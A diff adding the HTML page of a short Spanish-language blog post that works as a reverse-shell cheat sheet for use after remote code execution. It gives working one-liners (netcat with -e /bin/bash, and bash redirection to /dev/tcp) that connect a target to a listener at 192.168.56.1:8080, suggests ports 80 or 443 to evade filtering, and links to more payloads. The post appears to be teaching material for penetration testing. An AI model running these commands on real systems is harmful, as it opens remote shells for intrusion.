@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Beautiful Jekyll | MIT license | Copyright Dean Attali 2016 -->
+  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+
+  <title>Reverse shells</title>
+
+  <meta name="author" content="Out of Memory" />
+
+  
+
+  <link rel="alternate" type="application/rss+xml" title="outofmemory.io - You can't always apt-get what you want" href="http://localhost:4000/feed.xml" />
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css" />
+    
+      <link rel="stylesheet" href="/css/bootstrap-social.css" />
+    
+      <link rel="stylesheet" href="/css/main.css" />
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+    
+      <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+    
+  
+
+  
+
+  
+
+  
+
+    <!-- Facebook OpenGraph tags -->
+  
+
+  
+  <meta property="og:title" content="Reverse shells" />
+  
+
+   
+  <meta property="og:description" content="Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: bind de la shell a un puerto TCP. netcat Esto ya lo vimos hace tiempo en este articulo. Lo que ocurre es que: nc/netcat no siempre estará disponible si lo está, es posible que no...">
+  
+
+
+  <meta property="og:type" content="website" />
+
+  
+  <meta property="og:url" content="http://localhost:4000/2016-11-12-reverse-shell-cheat-sheet/" />
+  <link rel="canonical" href="http://localhost:4000/2016-11-12-reverse-shell-cheat-sheet/" />
+  
+
+  
+  <meta property="og:image" content="http://localhost:4000/img/spectrum.png" />
+  
+
+
+  <!-- Twitter summary cards -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@" />
+  <meta name="twitter:creator" content="@" />
+
+  
+  <meta name="twitter:title" content="Reverse shells" />
+  
+
+  
+  <meta name="twitter:description" content="Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: bind de la shell a un puerto TCP. netcat Esto ya lo vimos hace tiempo en este articulo. Lo que ocurre es que: nc/netcat no siempre estará disponible si lo está, es posible que no...">
+  
+
+  
+  <meta name="twitter:image" content="http://localhost:4000/img/spectrum.png" />
+  
+
+  
+
+  
+
+</head>
+
+
+  <body>
+
+    
+
+
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button><a class="navbar-brand" href="http://localhost:4000/">outofmemory.io</a></div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+          <li><a href="/about">About</a></li></ul>
+    </div>
+
+	
+	<div class="avatar-container">
+	  <div class="avatar-img-border">
+	    <a href="http://localhost:4000/">
+	      <img class="avatar-img" src="/img/spectrum.png" />
+		</a>
+	  </div>
+	</div>
+	
+
+  </div>
+</nav>
+
+
+    <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+  <div id="header-big-imgs" data-num-img=1
+    
+	  
+	  
+	    
+		  data-img-src-1="/img/reverse-shell.png"
+		
+	  
+    
+  ></div>
+
+
+<header class="header-section has-img">
+
+<div class="big-img intro-header">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Reverse shells</h1>
+		  
+		  
+		  
+		  <span class="post-meta">Posted on November 12, 2016</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class='img-desc'></span>
+</div>
+
+<div class="intro-header no-img">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-heading">
+          <h1>Reverse shells</h1>
+		  
+		  
+		  
+		  <span class="post-meta">Posted on November 12, 2016</span>
+		  
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+      
+
+      <article role="main" class="blog-post">
+        <p>Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: <em>bind</em> de la shell a un puerto TCP.</p>
+
+<h2 id="netcat">netcat</h2>
+
+<p>Esto ya lo vimos hace tiempo en este <a href="/2015-06-08-netcat-primer">articulo</a>. Lo que ocurre es que:</p>
+
+<ul>
+  <li>nc/netcat no siempre estará disponible</li>
+  <li>si lo está, es posible que no tenga la opción <code class="highlighter-rouge">-e</code></li>
+</ul>
+
+<p>En ese caso, puedo ponerme a escuchar (en un puerto accesible al sistema de destino):</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 8080
+</code></pre></div></div>
+
+<p>Y en destino:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 192.168.56.1 8080 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+<p>Ya podemos ejecutar comandos en el sistema remoto cómodamente sentados frente a nuestra máquina:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@mihost:~<span class="nv">$ </span>nc <span class="nt">-l</span> 8080
+hostname
+vmjessie
+</code></pre></div></div>
+
+<p>La máquina objeto de la ejecución de la shell inicia una conexión hacia el puerto de escucha (8080 en el ejemplo). Por eso es necesario elegir un puerto accesible, no filtrado; una elección segura serían los puertos 80 o 443.</p>
+
+<h2 id="bash">bash</h2>
+
+<p>En este caso no vamos a usar <code class="highlighter-rouge">nc</code> en el equipo objetivo, sino un descriptor asociado a un socket donde vamos a enviar las salidas de la shell. Partimos de nuestro equipo (en el ejemplo, nuestra IP es 192.168.56.1), donde estamos escuchando (con <code class="highlighter-rouge">nc</code> o lo que sea, da igual) en un puerto accesible:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-vvv</span> <span class="nt">-l</span> 8080
+</code></pre></div></div>
+
+<p>Y en el objetivo:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>5&lt;<span class="o">&gt;</span>/dev/tcp/192.168.56.1/8080
+<span class="nb">cat</span> &lt;&amp;5 | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;&amp;5 <span class="o">&gt;</span>&amp;5<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>Con esto, los comandos que tecleemos en nuestra máquina son ejecutados en la remota y la salida nos llega a nosotros:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@192.168.56.1:~<span class="nv">$ </span>nc <span class="nt">-vvv</span> <span class="nt">-l</span> 8080  
+hostname
+target
+</code></pre></div></div>
+
+<p>Mediante esta otra sintaxis:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@target:~<span class="nv">$ </span>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.168.56.1/8080 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>tenemos igualmente la consola en nuestra máquina, prompt incluido:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@192.168.56.1:~<span class="nv">$ </span>nc <span class="nt">-vvv</span> <span class="nt">-l</span> 8080  
+user@target:~<span class="nv">$ </span>hostname
+hostname
+target
+</code></pre></div></div>
+
+<p>Si hay alguna razón para ejecutar la shell vía algún lenguaje de scripting (PHP, Perl, Python, Java, Ruby… ¡¡Gawk!!) <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">aquí</a> hay un montón de pruebas de concepto para entretenerse un rato.</p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+          
+            <a href="/tags#shell">shell</a>
+          
+            <a href="/tags#netcat">netcat</a>
+          
+            <a href="/tags#security">security</a>
+          
+          
+        </div>
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+  <!--- Share on Twitter -->
+    <a href="https://twitter.com/intent/tweet?text=Reverse+shells&url=http%3A%2F%2Flocalhost%3A4000%2F2016-11-12-reverse-shell-cheat-sheet%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fa fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pager blog-pager">
+        
+        <li class="previous">
+          <a href="/2015-06-08-netcat-primer/" data-toggle="tooltip" data-placement="top" title="Uso de netcat">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="next">
+          <a href="/2016-12-06-first-post/" data-toggle="tooltip" data-placement="top" title="First post!">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+          
+        <div class="staticman-comments">
+          
+
+        </div>
+        <div class="justcomments-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+    <footer>
+  <div class="container beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links"><li><a href="/feed.xml" title="RSS"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">RSS</span>
+              </a>
+            </li><li><a href="mailto:outofmemory.io@protonmail.com" title="Email me"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Email me</span>
+              </a>
+            </li><li><a href="https://github.com/lmarqueta" title="GitHub"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">GitHub</span>
+              </a>
+            </li><li><a href="https://twitter.com/outofmemory_io" title="Twitter"><span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Twitter</span>
+              </a>
+            </li></ul>
+      <p class="copyright text-muted">
+      Out of Memory
+      &nbsp;&bull;&nbsp;
+      2019
+
+      
+      &nbsp;&bull;&nbsp;
+      <a href="http://localhost:4000/">outofmemory.io</a>
+      
+
+      
+      </p>
+          <!-- Please don't remove this, keep my open source work credited :) -->
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script>
+      	if (typeof jQuery == 'undefined') {
+          document.write('<script src="/js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+      	}
+      </script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/js/bootstrap.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/js/main.js"></script>
+    
+  
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+  <script>
+  window.cookieconsent.initialise({
+    "palette": {
+      "popup": {
+        "background": "#252e39"
+      },
+      "button": {
+        "background": "#14a7d0"
+      }
+    },
+    "theme": "classic"
+  });
+  </script>
+  </body>
+</html>
